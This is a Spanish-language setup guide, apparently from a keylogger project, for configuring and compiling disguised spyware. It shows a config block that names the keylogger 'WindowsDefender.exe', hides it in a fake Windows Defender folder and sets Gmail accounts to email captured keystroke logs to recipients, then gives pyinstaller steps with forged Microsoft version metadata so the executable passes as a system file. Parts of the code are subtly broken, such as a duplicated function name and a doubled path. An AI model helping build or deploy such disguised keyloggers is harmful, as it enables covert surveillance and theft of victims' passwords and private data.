[Volver al a la documentación](../README.md)

# Custom __[Developer Junior]__

````py
# ****************************************   ZONA CUSTOM   *********************************
def GetNameKey():                   # Retorna el nombre del Keylogger compilado *.EXE
    return "WindowsDefender.exe"    # este archivo debe tener el mismo nombre "WindowsDefender.py"  
def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger y log.txt
    return "C:\\Users\\Public\\Security\\Windows Defender\\"
def LogName():  # Nombre del log (Registro de teclas)
    return ".key"
def FilePath():
    return str(GetPathOcult()+GetPathOcult())

# Correo de envío [Primaria] 
def emailP():                   # <<== Cambia éste correo
    return "Send123@gmail.com" 
def passP():                    # <<== Contraseña del correo
    return "contraseña1"
# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
def emailS():                   # <<== Cambia éste correo
    return "Sendabc@gmail.com"
def emailP():                   # <<== Contraseña del correo 
    return "contraseña2"

#Correos que recibirán los archivos log
def ReceiveE():
    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
    return ["Recibe1@gmail.com"]                                                # MonoCorreo

# *****************************************   FIN ZONA CUSTOM   *******************************
````


# Proceso de conversión: `*.py a *.exe`
Se utilizará `pyinstaller`
1. En la carpeta principal encontrará dos archivos, uno llamado `icon.ico` y el otro `version.txt`, éstos 2 archivos son importantes para la conversión del `*.py a *.exe`.
    - `icon.ico` = El icono que tendrá el keylogger al ser convertido
    - `version.txt` = Información detallada del keyloger.
    
    Si el siguiente proceso se realiza con exito, el keylogger estará disfrazado así como las siguientes imagenes.
    

    ![Imagen1](https://i.imgur.com/4ytoK3h.png)
    ![Imagen2](https://i.imgur.com/1Dj2Tat.png)

    Toda esa información puede ser modificada en el archivo de la plantilla `version.txt`
2. __Disfraz _[Información]_:__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
```` t
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(6, 1, 7601, 17514),
    prodvers=(6, 1, 7601, 17514),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'Microsoft CorpoKeyloggerion'),
        StringStruct(u'FileDescription', u'Windows Security Health Host Key'),
        StringStruct(u'FileVersion', u'6.1.7601.17514 (win7sp1_rtm.101119-1850)'),
        StringStruct(u'InternalName', u'Windows Defender'),
        StringStruct(u'LegalCopyright', u'\xa9 Microsoft CorpoKeyloggerion. All rights reserved.'),
        StringStruct(u'OriginalFilename', u'SecurityHealthHostKey.exe'),
        StringStruct(u'ProductName', u'Microsoft\xae Windows\xae OpeKeyloggering System'),
        StringStruct(u'ProductVersion', u'6.1.7601.17514')])
      ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
````




3. __Conversión final:__
Mediante Consola debe dirigirse a la carpeta principal.
Los requisitos es tener instalada la librería `pyinstaller`, porfavor mire un tutorial antes de hacer éste proceso, la linea de comando recomendada es la siguiente:


    ````r
    pyinstaller --clean   --distpath "EXE" -F --windowed --icon icon.ico --version-file version.txt "Tu nombre custom".py
    ````